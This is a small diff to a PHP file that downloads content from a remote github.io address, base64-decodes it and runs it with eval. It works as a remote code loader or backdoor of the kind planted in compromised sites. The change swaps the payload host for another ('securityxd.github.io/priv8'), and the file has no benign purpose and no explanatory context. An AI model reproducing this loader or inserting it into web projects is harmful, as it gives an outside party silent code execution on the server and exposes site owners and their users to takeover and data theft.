@@ -1,5 +1,5 @@
 <?php
-$pf = "https://31333337.github.io/encalfa";
+$pf = "https://securityxd.github.io/priv8/encalfa";
 $puf = file_get_contents($pf); 
 eval("?>".(base64_decode($puf)));
 ?>
